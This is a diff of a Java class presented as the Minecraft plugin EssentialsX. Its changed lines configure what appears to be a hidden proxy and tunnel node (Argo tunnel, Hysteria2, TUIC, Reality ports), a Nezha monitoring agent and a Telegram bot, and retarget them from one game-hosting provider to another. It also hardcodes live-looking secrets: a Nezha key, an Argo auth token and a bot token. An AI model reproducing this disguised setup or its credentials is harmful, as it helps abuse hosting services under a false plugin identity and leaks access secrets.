@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "Whkffx3bys2HgKy45iNzKVGgG1Qq8Qbv");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "minerack.bo33.qzz.io");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiYTgyZmQ5ZWYtNzhkOS00MWVmLTk0YjItYWIzNzU0OTA3N2ZhIiwicyI6IlptWmxNelk1WVRFdE1EaGtOaTAwT1dNNExUa3pZekV0TnpSa1ltTmxNREJoTkdSayJ9");
+        env.put("ARGO_DOMAIN", "weirdhost.bo66.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiOTUzMmZiZDYtY2Q3OS00NzY3LWI4MzEtMTFjNTA4NzlkOWQ3IiwicyI6Ik5HWXhZbUk1T0dZdE9HUmlZeTAwTXpBNUxUZ3lZVGN0TkRrM1pUVTBPV0U1TlRNeCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "26496");
+        env.put("HY2_PORT", "25101");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "8333285464:AAE9xFo7w51MclwGz-OA_vud9MC5N9RNRCQ");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "godlike-us-bo");
+        env.put("NAME", "weirdhost-kr");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
